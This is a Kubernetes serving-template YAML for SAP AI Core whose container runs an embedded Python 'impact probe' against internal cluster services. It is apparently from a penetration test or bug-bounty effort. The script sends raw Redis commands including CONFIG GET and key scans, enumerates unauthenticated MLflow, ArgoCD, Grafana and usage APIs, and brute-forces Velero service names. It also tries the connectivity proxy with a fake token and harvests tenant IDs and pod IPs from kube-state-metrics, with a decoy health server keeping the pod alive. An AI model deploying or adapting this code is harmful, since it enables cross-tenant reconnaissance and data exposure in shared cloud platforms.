apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: impact-probe-v2
  labels:
    scenarios.ai.sap.com/id: "impact-probe-v2"
    ai.sap.com/version: "1.0.0"
  annotations:
    scenarios.ai.sap.com/name: "impact-probe-v2"
    executables.ai.sap.com/name: "impact-probe-v2"
    executables.ai.sap.com/description: "impact verification probe v2"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            cat > /tmp/probe.py << 'PYEOF'
            import os, ssl, socket, json, re, base64, time
            import urllib.request, urllib.error

            def report(k, v):
                print(f"[P2] {k}: {str(v)[:5000]}", flush=True)

            def http_get(url, headers=None, timeout=8, use_ssl=False):
                try:
                    req = urllib.request.Request(url, headers=headers or {})
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                        return r.read().decode("utf-8", errors="replace"), r.status, dict(r.headers)
                except urllib.error.HTTPError as e:
                    body = ""
                    try: body = e.read().decode("utf-8", errors="replace")[:800]
                    except: pass
                    return f"HTTP_{e.code}:{body}", e.code, dict(e.headers) if hasattr(e, 'headers') else {}
                except Exception as e:
                    return f"ERR:{e}", 0, {}

            def http_post(url, data, headers=None, timeout=8):
                try:
                    h = {"Content-Type": "application/json"}
                    if headers: h.update(headers)
                    req = urllib.request.Request(url, data=data if isinstance(data, bytes) else json.dumps(data).encode(), headers=h, method="POST")
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                        return r.read().decode("utf-8", errors="replace"), r.status
                except urllib.error.HTTPError as e:
                    body = ""
                    try: body = e.read().decode("utf-8", errors="replace")[:800]
                    except: pass
                    return f"HTTP_{e.code}:{body}", e.code
                except Exception as e:
                    return f"ERR:{e}", 0

            def tcp_send(host, port, data, timeout=6, read_bytes=4096):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(timeout)
                    s.connect((host, port))
                    if isinstance(data, str):
                        data = data.encode()
                    s.sendall(data)
                    time.sleep(0.5)
                    resp = b""
                    s.settimeout(3)
                    try:
                        while True:
                            chunk = s.recv(read_bytes)
                            if not chunk: break
                            resp += chunk
                            if len(resp) > 32768: break
                    except socket.timeout:
                        pass
                    s.close()
                    return resp.decode("utf-8", errors="replace")
                except Exception as e:
                    return f"ERR:{e}"

            report("HOSTNAME", os.uname().nodename)
            report("EGRESS", http_get("https://ifconfig.me/ip", timeout=5)[0])

            # ── 1. REDIS (user-management) ────────────────────────────────────────
            # Previous probe confirmed TCP OPEN on redis.user-management.svc.cluster.local:6379
            report("---", "=== REDIS user-management ===")
            redis_hosts = [
                ("redis.user-management.svc.cluster.local", 6379),
                ("redis-master.user-management.svc.cluster.local", 6379),
                ("redis-headless.user-management.svc.cluster.local", 6379),
            ]
            for rhost, rport in redis_hosts:
                # Redis inline commands
                ping = tcp_send(rhost, rport, b"PING\r\n")
                report(f"REDIS_PING_{rhost}", ping[:200])
                if "PONG" in ping or "+OK" in ping or "$" in ping:
                    report("REDIS_REACHABLE", f"{rhost}:{rport}")
                    # INFO server
                    info = tcp_send(rhost, rport, b"INFO server\r\n", read_bytes=8192)
                    report("REDIS_INFO_server", info[:1000])
                    # INFO all
                    info_all = tcp_send(rhost, rport, b"INFO all\r\n", read_bytes=16384)
                    report("REDIS_INFO_all", info_all[:3000])
                    # DBSIZE
                    dbsize = tcp_send(rhost, rport, b"DBSIZE\r\n")
                    report("REDIS_DBSIZE", dbsize[:100])
                    # KEYS * (careful - may be slow on large keyspace; use SCAN instead)
                    scan = tcp_send(rhost, rport, b"SCAN 0 COUNT 20\r\n", read_bytes=8192)
                    report("REDIS_SCAN_0", scan[:2000])
                    # CONFIG GET *
                    cfg = tcp_send(rhost, rport, b"CONFIG GET *\r\n", read_bytes=16384)
                    report("REDIS_CONFIG", cfg[:3000])
                    # CLIENT LIST
                    clients = tcp_send(rhost, rport, b"CLIENT LIST\r\n", read_bytes=4096)
                    report("REDIS_CLIENT_LIST", clients[:1000])
                    break

            # ── 2. ML-TRACKING (MLflow) ───────────────────────────────────────────
            report("---", "=== ML-TRACKING (MLflow) ===")
            ml_base = "http://ml-tracking-service.ml-tracking.svc.cluster.local:80"
            # MLflow REST API v2 paths - some may be unauthenticated
            mlflow_paths = [
                "/health",
                "/",
                "/api/2.0/mlflow/experiments/list",
                "/api/2.0/mlflow/experiments/search",
                "/api/2.0/mlflow/runs/search",
                "/api/2.0/mlflow/registered-models/list",
                "/ajax-api/2.0/mlflow/experiments/list",
                "/ajax-api/2.0/mlflow/registered-models/list",
                "/metrics",
                "/api/2.0/preview/mlflow/experiments/list",
            ]
            for path in mlflow_paths:
                body, code, hdrs = http_get(f"{ml_base}{path}", timeout=6)
                report(f"MLFLOW_{path.replace('/','_').strip('_')}", f"[{code}] hdrs={list(hdrs.keys())[:5]} body={body[:400]}")
                if code == 200:
                    report("MLFLOW_SUCCESS_PATH", path)

            # ── 3. USAGE-API ──────────────────────────────────────────────────────
            report("---", "=== USAGE-API ===")
            usage_base = "http://usage-api-service.usage-api.svc.cluster.local:80"
            for path in ["/", "/health", "/healthz", "/metrics", "/api/v1/usage", "/api/v1/reports"]:
                body, code, hdrs = http_get(f"{usage_base}{path}", timeout=6)
                report(f"USAGE_{path.replace('/','_').strip('_')}", f"[{code}] body={body[:300]}")

            # ── 4. COUCHDB ALTERNATE PORTS ────────────────────────────────────────
            report("---", "=== COUCHDB alt ports ===")
            couch_host = "couchdb-couchdb.couchdb.svc.cluster.local"
            # 5984=http, 5986=admin/local, 6984=https, 4369=epmd, 9100=cluster
            for port in [5986, 6984, 4369, 9100]:
                body, code, _ = http_get(f"http://{couch_host}:{port}/", timeout=5)
                report(f"COUCH_port_{port}", f"[{code}] {body[:300]}")
            # Also try raw TCP to 5984 to see what the RST is about
            raw = tcp_send(couch_host, 5984,
                           b"GET / HTTP/1.0\r\nHost: couchdb-couchdb.couchdb.svc.cluster.local\r\n\r\n",
                           timeout=5)
            report("COUCH_RAW_TCP_5984", raw[:300])
            # Try HTTPS on 6984
            body, code, _ = http_get(f"https://{couch_host}:6984/", timeout=5)
            report("COUCH_HTTPS_6984", f"[{code}] {body[:300]}")

            # ── 5. VELERO DNS BRUTE-FORCE ─────────────────────────────────────────
            report("---", "=== VELERO service discovery ===")
            velero_candidates = [
                ("velero", "velero", 8085),
                ("velero", "velero", 11000),
                ("velero-service", "velero", 8085),
                ("velero-restic", "velero", 8085),
                ("node-agent", "velero", 8085),
                ("velero", "velero", 80),
                ("velero-backup-service", "velero", 8085),
                # try in other namespaces
                ("velero", "kube-system", 8085),
                ("velero", "backup", 8085),
                ("velero", "platform-tooling", 8085),
            ]
            for svc, ns, port in velero_candidates:
                fqdn = f"{svc}.{ns}.svc.cluster.local"
                body, code, _ = http_get(f"http://{fqdn}:{port}/", timeout=4)
                report(f"VELERO_{svc}_{ns}_{port}", f"[{code}] {body[:200]}")
                if code != 0 and "Name or service not known" not in body:
                    report("VELERO_FOUND", f"{fqdn}:{port} => [{code}]")

            # ── 6. ARGOCD API ─────────────────────────────────────────────────────
            report("---", "=== ARGOCD API ===")
            argocd_candidates = [
                "https://argocd-server.argocd-tenants.svc.cluster.local:443",
                "http://argocd-server.argocd-tenants.svc.cluster.local:80",
                "https://argocd-server.argocd.svc.cluster.local:443",
            ]
            for abase in argocd_candidates:
                body, code, hdrs = http_get(f"{abase}/api/version", timeout=6)
                report(f"ARGOCD_version_{abase.split('/')[2]}", f"[{code}] {body[:300]}")
                if code == 200:
                    body2, code2, _ = http_get(f"{abase}/api/v1/applications", timeout=6)
                    report("ARGOCD_apps_NOAUTH", f"[{code2}] {body2[:500]}")
                    break

            # ── 7. NOT-DIAMOND prompt optimizer ──────────────────────────────────
            report("---", "=== NOT-DIAMOND ===")
            nd_candidates = [
                ("nd-prompt-optimizer-server", "not-diamond", 80),
                ("nd-prompt-optimizer-server", "not-diamond", 8080),
                ("nd-prompt-optimizer-server", "not-diamond", 5000),
                ("nd-prompt-optimizer-server", "not-diamond", 443),
            ]
            for svc, ns, port in nd_candidates:
                fqdn = f"{svc}.{ns}.svc.cluster.local"
                body, code, _ = http_get(f"http://{fqdn}:{port}/", timeout=5)
                report(f"ND_{port}", f"[{code}] {body[:300]}")
                if code == 200 or (code != 0 and "Name or service" not in body):
                    for path in ["/health", "/v1/models", "/api", "/metrics"]:
                        b2, c2, _ = http_get(f"http://{fqdn}:{port}{path}", timeout=5)
                        report(f"ND_{port}{path.replace('/','_')}", f"[{c2}] {b2[:400]}")

            # ── 8. CONNECTIVITY PROXY with our XSUAA token ────────────────────────
            report("---", "=== CONNECTIVITY PROXY ===")
            # Previous probe: returned 400 "SAP-CP-Connectivity-Service-Token header is missing"
            # Our tenant JWT is in the env or we can fetch it — try passing it
            import os
            # Try fetching our AI Core XSUAA token from env (unlikely to be set, but try)
            xsuaa_token = os.environ.get("AICORE_TOKEN", "")
            conn_proxy = "http://connectivity-proxy.connectivity-proxy.svc.cluster.local:20003"
            # Try without token first
            body, code, hdrs = http_get(conn_proxy, timeout=6)
            report("CONN_PROXY_NOAUTH", f"[{code}] {body[:300]}")
            # Try with placeholder token to see what validation error we get
            body, code, _ = http_get(conn_proxy,
                headers={"SAP-CP-Connectivity-Service-Token": "eytest"},
                timeout=6)
            report("CONN_PROXY_FAKE_TOKEN", f"[{code}] {body[:300]}")

            # ── 9. GRAFANA alt ports & HTTPS ─────────────────────────────────────
            report("---", "=== GRAFANA alt ===")
            grafana_host = "grafana-service.grafana.svc.cluster.local"
            for port in [3000, 9094, 8080, 443, 80]:
                body, code, _ = http_get(f"http://{grafana_host}:{port}/api/health", timeout=4)
                report(f"GRAFANA_port_{port}", f"[{code}] {body[:200]}")
            # Raw TCP to understand what's happening
            raw_g = tcp_send(grafana_host, 3000,
                             b"GET /api/health HTTP/1.0\r\nHost: grafana-service.grafana.svc.cluster.local\r\n\r\n",
                             timeout=5)
            report("GRAFANA_RAW_TCP_3000", raw_g[:400])

            # ── 10. KSM still open? (recheck) ────────────────────────────────────
            report("---", "=== KSM recheck ===")
            ksm_url = "http://ksm-multi-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics"
            body, code, _ = http_get(ksm_url, timeout=15)
            report("KSM_MULTI_STATUS", f"[{code}] len={len(body)}")
            if code == 200:
                tids = re.findall(r'label_ai_sap_com_tenant_id="([^"]+)"', body)
                report("KSM_TENANT_COUNT", str(len(set(tids))))
                # also get grafana pod IPs from ksm-pods for fresh IPs
                ksm_pods_url = "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics"
                bp, cp, _ = http_get(ksm_pods_url, timeout=15)
                report("KSM_PODS_STATUS", f"[{cp}] len={len(bp)}")
                if cp == 200:
                    grafana_ips = re.findall(r'pod="grafana[^"]*"[^}]*}\s+([\d.]+)', bp)
                    couch_ips = [l for l in bp.split("\n") if "couchdb" in l.lower() and "pod_ip" in l.lower()]
                    velero_ips = [l for l in bp.split("\n") if "velero" in l.lower() and "pod_ip" in l.lower()]
                    report("KSM_GRAFANA_PODS", str(grafana_ips[:10]))
                    report("KSM_COUCH_PODS", str(couch_ips[:10]))
                    report("KSM_VELERO_PODS", str(velero_ips[:10]))
                    # get fresh pod IPs for couchdb and grafana from kube_pod_info
                    for svc in ["grafana", "couchdb", "velero"]:
                        hits = [l for l in bp.split("\n") if svc in l.lower() and "kube_pod_info" in l.lower()]
                        report(f"KSM_POD_INFO_{svc}", "\n".join(hits[:5]))

            report("DONE", "probe v2 complete")
            PYEOF
            python3 /tmp/probe.py 2>&1
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self):
                    self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
          ports:
          - containerPort: 8080
            protocol: TCP
          readinessProbe:
            httpGet:
              path: /
              port: 8080
            initialDelaySeconds: 30
            periodSeconds: 10
          livenessProbe:
            httpGet:
              path: /
              port: 8080
            initialDelaySeconds: 30
            periodSeconds: 15
